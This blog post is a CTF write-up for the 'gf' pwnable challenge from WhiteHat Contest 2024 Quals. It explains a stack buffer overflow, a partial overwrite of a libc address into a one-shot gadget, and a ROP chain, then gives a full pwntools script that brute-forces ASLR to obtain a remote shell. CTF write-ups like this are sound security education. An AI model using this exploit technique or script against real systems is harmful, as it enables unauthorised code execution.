+++
title = "WhiteHat Contest 2024 Quals - gf"
date = "2024-11-19"
description = "WhiteHat Contest 2024 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "rop", "partial overwrite", "one gadget", "brute force"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/gf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

A challenge where I got stuck combining gadgets here and there.
I figured out the solution 20 minutes before the end...


## 0x01. Vulnerability
``` c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char dest[16]; // [rsp+10h] [rbp-10h] BYREF

  setbuf_4011A5();
  read(0, &unk_404060, 0xBCuLL);
  memcpy(dest, &unk_404060, 0xBBuLL);
  return 1LL;
}
```

A simple BOF vulnerability occurs where 0xbc bytes are read into the 16-byte `dest`.


## 0x02. Exploit
There's not a single gadget for ROP, let alone an output function.
Then I got a hint from looking at memory.

``` bash
gef➤  x/4gx $rsp + 0xb0
0x7fffffffed00: 0x0000000000000000      0x0000000000000000
0x7fffffffed10: 0x0000000000000000      0x00007ffff7000000
```

Looking around `dest + 0xb8`, the end of `read()`, there's a suspicious libc address.
The lower 3 bytes are `0x00`, and we can write exactly up to this point.

``` bash
gef➤  x/4gx $rsp + 0xb0
0x7fffffffed00: 0x4141414141414141      0x4141414141414141
0x7fffffffed10: 0x4141414141414141      0x00007ffff7434241
```

So without a libc leak, we can use this part to craft an expected one-shot gadget address and hope that ASLR loads the actual one-shot gadget at that address.

The register values when returning from `main()` are as follows.

``` bash
$rax   : 0x1
$rbx   : 0x0
$rcx   : 0x0000000000404060  →  "AAAAAAAAAAAAAAAA\n"
$rdx   : 0xbb
$rsp   : 0x00007fffffffec98  →  0x0000000000000000
$rbp   : 0xa
$rsi   : 0x0000000000404060  →  "AAAAAAAAAAAAAAAA\n"
$rdi   : 0x00007fffffffec80  →  "AAAAAAAAAAAAAAAA\n"
$rip   : 0x0000000000401281  →   ret
$r8    : 0x00007ffff7fabf10  →  0x0000000000000004
$r9    : 0x00007ffff7fc9040  →  0xe5894855fa1e0ff3
$r10   : 0x00007ffff7fc3908  →  0x000d00120000000e
$r11   : 0x246
$r12   : 0x00007fffffffeda8  →  0x00007fffffffef5c  →  0x3d48544150006667 ("gf"?)
$r13   : 0x000000000040122a  →   endbr64
$r14   : 0x0000000000403dc0  →  0x0000000000401160  →   endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
```

At this point, we need to satisfy the one-shot gadget conditions.
After staring at gadgets for hours, the method immediately came to mind.

``` bash
➜  one_gadget libc.so.6
...
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
...
```

Among the one-shot gadgets, there was one with constraints on `rsi` and `rdx` like above, and the binary has gadgets like these.

``` bash
➜  objdump -M intel -d gf
...
# shift_rsi_ret gadget
  40112c:       48 89 f0                mov    rax,rsi
  40112f:       48 c1 ee 3f             shr    rsi,0x3f
  401133:       48 c1 f8 03             sar    rax,0x3
  401137:       48 01 c6                add    rsi,rax
  40113a:       48 d1 fe                sar    rsi,1
  40113d:       74 11                   je     401150 <setvbuf@plt+0xb0>
  40113f:       b8 00 00 00 00          mov    eax,0x0
  401144:       48 85 c0                test   rax,rax
  401147:       74 07                   je     401150 <setvbuf@plt+0xb0>
  401149:       bf 10 40 40 00          mov    edi,0x404010
  40114e:       ff e0                   jmp    rax
  401150:       c3                      ret
...
# pop_rsi_pop_rdx_push_rsi_ret gadget
  40119e:       5e                      pop    rsi
  40119f:       5a                      pop    rdx
  4011a0:       56                      push   rsi
  4011a1:       c3                      ret
```

First, `rdx` can be controlled through the `pop_rsi_pop_rdx_push_rsi_ret` gadget, and for some reason, the `shift_rsi_ret` gadget can right shift `rsi` by 0.5 bytes.
Since `rsi` is holding `0x404060`, calling the `shift_rsi_ret` gadget 6 times makes `rsi` `0`.

Additionally, there's a constraint that `rbp-0x78` must be writable, so I set it to roughly `0x404800`, the middle of the Data section.

Calculating the success rate, `0x7ffff7XXXc88` should be the actual one-shot gadget address, so it's 1.5 bytes, meaning a 1/4096 probability of successful exploitation.

However, after the preliminaries ended, I saw someone else's exploit with a method that could succeed 100%.
Since this was new to me and seems generally applicable, I'll make a separate post about it.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "gf"
LIBRARY = "libc.so.6"
CONTAINER = "5189692c7e21"
bp = {
    'main_ret' : 0x401281,
}

gs = f'''
b *{bp["main_ret"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        # s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    shift_rsi_ret = 0x40112c
    pop_rsi_pop_rdx_push_rsi_ret = 0x40119e

    payload = b"A" * 0x10
    payload += p64(0x404800)
    payload += p64(pop_rsi_pop_rdx_push_rsi_ret)
    payload += p64(shift_rsi_ret)
    payload += p64(0)
    payload += p64(shift_rsi_ret) * 5
    payload += p64(bp['main_ret']) * ((0xb8 - len(payload)) // 8)
    payload += b"\x88\xac\x4b"      # 0x754c18 4b ac 88

    while 1:
        s = remote(server, port)
        s.sendline(payload)
        try:
            sleep(0.2)
            s.sendline(b"id")
            r = s.recvline(timeout=1)
            if b"(pwn)" in r:
                log.success(f"id : {r}")
                s.interactive()
                s.close()
            else:
                log.info(r)
        except Exception as e:
            log.failure(e)
            s.close()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```